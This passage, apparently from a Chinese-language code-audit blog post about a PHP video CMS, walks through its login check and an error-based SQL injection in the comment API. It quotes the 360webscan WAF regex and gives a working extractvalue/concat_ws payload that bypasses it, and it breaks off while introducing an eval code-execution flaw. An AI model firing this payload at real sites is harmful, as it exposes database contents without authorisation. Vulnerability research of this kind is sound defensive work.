+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$action</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$action</span><span class="p">)</span> <span class="o">?</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$action</span><span class="p">)</span> <span class="o">:</span> <span class="s1">&#39;cc&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$page</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$page</span><span class="p">)</span> <span class="o">?</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$page</span><span class="p">)</span> <span class="o">:</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$uid</span><span class="o">=</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sea_user_id&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$uid</span> <span class="o">=</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$uid</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$hashstr</span><span class="o">=</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$cfg_dbpwd</span><span class="o">.</span><span class="nv">$cfg_dbname</span><span class="o">.</span><span class="nv">$cfg_dbuser</span><span class="p">);</span><span class="c1">//构造session安全码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$uid</span><span class="p">)</span> <span class="k">OR</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;hashstr&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="nv">$hashstr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">showMsg</span><span class="p">(</span><span class="s2">&#34;请先登录&#34;</span><span class="p">,</span><span class="s2">&#34;login.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">exit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>后台的登录处理如下,无法利用数组进行绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">checkUser</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$userpwd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$dsql</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">//只允许用户名和密码用0-9,a-z,A-Z,&#39;@&#39;,&#39;_&#39;,&#39;.&#39;,&#39;-&#39;这些字符
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">userName</span> <span class="o">=</span> <span class="nx">m_ereg_replace</span><span class="p">(</span><span class="s2">&#34;[^0-9a-zA-Z_@!\.-]&#34;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$username</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">userPwd</span> <span class="o">=</span> <span class="nx">m_ereg_replace</span><span class="p">(</span><span class="s2">&#34;[^0-9a-zA-Z_@!\.-]&#34;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$userpwd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$pwd</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">userPwd</span><span class="p">),</span><span class="mi">5</span><span class="p">,</span><span class="mi">20</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$dsql</span><span class="o">-&gt;</span><span class="na">SetQuery</span><span class="p">(</span><span class="s2">&#34;Select * From `sea_admin` where name like &#39;&#34;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">userName</span><span class="o">.</span><span class="s2">&#34;&#39; and state=&#39;1&#39; limit 0,1&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$dsql</span><span class="o">-&gt;</span><span class="na">Execute</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$row</span> <span class="o">=</span> <span class="nv">$dsql</span><span class="o">-&gt;</span><span class="na">GetObject</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$row</span><span class="o">-&gt;</span><span class="na">password</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$pwd</span><span class="o">!=</span><span class="nv">$row</span><span class="o">-&gt;</span><span class="na">password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$loginip</span> <span class="o">=</span> <span class="nx">GetIP</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">userID</span> <span class="o">=</span> <span class="nv">$row</span><span class="o">-&gt;</span><span class="na">id</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">groupid</span> <span class="o">=</span> <span class="nv">$row</span><span class="o">-&gt;</span><span class="na">groupid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">userName</span> <span class="o">=</span> <span class="nv">$row</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$inquery</span> <span class="o">=</span> <span class="s2">&#34;update `sea_admin` set loginip=&#39;</span><span class="si">$loginip</span><span class="s2">&#39;,logintime=&#39;&#34;</span><span class="o">.</span><span class="nx">time</span><span class="p">()</span><span class="o">.</span><span class="s2">&#34;&#39; where id=&#39;&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="o">-&gt;</span><span class="na">id</span><span class="o">.</span><span class="s2">&#34;&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$dsql</span><span class="o">-&gt;</span><span class="na">ExecuteNoneQuery</span><span class="p">(</span><span class="nv">$inquery</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="commentapiindexphp存在报错注入">comment/api/index.php存在报错注入</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$page</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$jsoncachefile</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$json</span><span class="o">=</span><span class="nx">LoadFile</span><span class="p">(</span><span class="nv">$jsoncachefile</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">die</span><span class="p">(</span><span class="nv">$json</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$h</span> <span class="o">=</span> <span class="nx">ReadData</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="nv">$page</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$rlist</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$page</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">createTextFile</span><span class="p">(</span><span class="nv">$h</span><span class="p">,</span><span class="nv">$jsoncachefile</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">die</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>	
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">ReadData</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="nv">$page</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">global</span> <span class="nv">$type</span><span class="p">,</span><span class="nv">$pCount</span><span class="p">,</span><span class="nv">$rlist</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$ret</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$page</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="nv">$type</span><span class="p">,</span><span class="nv">$id</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nv">$id</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$ret</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">Readmlist</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="nv">$page</span><span class="p">,</span><span class="nv">$ret</span><span class="p">[</span><span class="mi">4</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$ret</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$pCount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$x</span> <span class="o">=</span> <span class="nx">implode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span><span class="nv">$rlist</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$x</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$ret</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">Readrlist</span><span class="p">(</span><span class="nv">$x</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>	
+</span></span><span class="line"><span class="cl">	<span class="nv">$readData</span> <span class="o">=</span> <span class="nx">FormatJson</span><span class="p">(</span><span class="nv">$ret</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nv">$readData</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">Readrlist</span><span class="p">(</span><span class="nv">$ids</span><span class="p">,</span><span class="nv">$page</span><span class="p">,</span><span class="nv">$size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">global</span> <span class="nv">$dsql</span><span class="p">,</span><span class="nv">$type</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$rl</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea_comment WHERE m_type=</span><span class="si">$type</span><span class="s2"> AND id in (</span><span class="si">$ids</span><span class="s2">) ORDER BY id DESC&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$dsql</span><span class="o">-&gt;</span><span class="na">setQuery</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$dsql</span><span class="o">-&gt;</span><span class="na">Execute</span><span class="p">(</span><span class="s1">&#39;commentrlist&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">while</span><span class="p">(</span><span class="nv">$row</span><span class="o">=</span><span class="nv">$dsql</span><span class="o">-&gt;</span><span class="na">GetArray</span><span class="p">(</span><span class="s1">&#39;commentrlist&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$rl</span><span class="p">[]</span><span class="o">=</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">:{</span><span class="se">\&#34;</span><span class="s2">uid</span><span class="se">\&#34;</span><span class="s2">:&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;,</span><span class="se">\&#34;</span><span class="s2">tmp</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">nick</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">face</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">star</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">anony</span><span class="se">\&#34;</span><span class="s2">:&#34;</span><span class="o">.</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;,</span><span class="se">\&#34;</span><span class="s2">from</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">time</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;dtime&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">reply</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;reply&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">content</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">agree</span><span class="se">\&#34;</span><span class="s2">:&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;agree&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;,</span><span class="se">\&#34;</span><span class="s2">aginst</span><span class="se">\&#34;</span><span class="s2">:&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;anti&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;,</span><span class="se">\&#34;</span><span class="s2">pic</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;pic&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">vote</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;vote&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">allow</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;anti&#39;</span><span class="p">])</span><span class="o">?</span><span class="mi">0</span><span class="o">:</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">check</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;ischeck&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">}&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$readrlist</span><span class="o">=</span><span class="nx">join</span><span class="p">(</span><span class="nv">$rl</span><span class="p">,</span><span class="s2">&#34;,&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nv">$readrlist</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意到<code>Readrlist</code>中的sql语句为<code>$sql = &quot;SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea_comment WHERE m_type=$type AND id in ($ids) ORDER BY id DESC&quot;;</code>,<code>$ids</code>使用<code>()</code>进行闭合,可能会存在注入漏洞</p>
+<p>在<code>ReadData</code>函数中<code>$x = implode(',',$rlist);</code>并调用<code>Readrlist($x,1,10000)</code>,向<code>$rlist</code>传入一个含有恶意字符串的数组,通过<code>implode</code>进行拼接转换为字符串,即可在<code>Readrlist</code>中进行注入</p>
+<p><code>使用$rlist</code>需要满足前置条件即<code>page&gt;=2</code>和<code>id&gt;0</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$page</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$jsoncachefile</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$json</span><span class="o">=</span><span class="nx">LoadFile</span><span class="p">(</span><span class="nv">$jsoncachefile</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">die</span><span class="p">(</span><span class="nv">$json</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$h</span> <span class="o">=</span> <span class="nx">ReadData</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="nv">$page</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>$rlist $id $page</code>来源于用户传入的参数,而这些参数在<code>include/common.php</code>完成注册,因此这里直接传参即可进行sql注入,但要注意360webscan存在过滤</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">\\&lt;.+javascript:window\\[.{1}\\\\x|&lt;.*=(&amp;#\\d+?;?)+?&gt;|&lt;.*(data|src)=data:text\\/html.*&gt;|\\b(alert\\(|confirm\\(|expression\\(|prompt\\(|benchmark\s*?\(.*\)|sleep\s*?\(.*\)|\\b(group_)?concat[\\s\\/\\*]*?\\([^\\)]+?\\)|\bcase[\s\/\*]*?when[\s\/\*]*?\([^\)]+?\)|load_file\s*?\\()|&lt;[a-z]+?\\b[^&gt;]*?\\bon([a-z]{4,})\s*?=|^\\+\\/v(8|9)|\\b(and|or)\\b\\s*?([\\(\\)&#39;\&#34;\\d]+?=[\\(\\)&#39;\&#34;\\d]+?|[\\(\\)&#39;\&#34;a-zA-Z]+?=[\\(\\)&#39;\&#34;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&#34;&#39;])|\\/\\*.*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|&#39;|\&#34;).*?(`|&#39;|\&#34;)\s*)|UPDATE\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|&#39;|\&#34;).*?(`|&#39;|\&#34;)\s*)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)@{0,2}(\\(.+\\)|\\s+?.+?\\s+?|(`|&#39;|\&#34;).*?(`|&#39;|\&#34;))FROM(\\(.+\\)|\\s+?.+?|(`|&#39;|\&#34;).*?(`|&#39;|\&#34;))|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>过滤<code>UPDATE</code>用<code>extractvalue</code>替换,过滤<code>(group_)?concat</code>用<code>concat_ws</code></p>
+<p><code>gid=1&amp;page=3&amp;rlist[]=extractvalue(1,concat_ws(0x7e,1,user(),database(),version()))</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081107983.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081107983.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081107983.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081107983.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081107983.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081107983.png" /></p>
+<h2 id="includemainclassphp存在eval代码执行">include/main.class.php存在eval代码执行</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
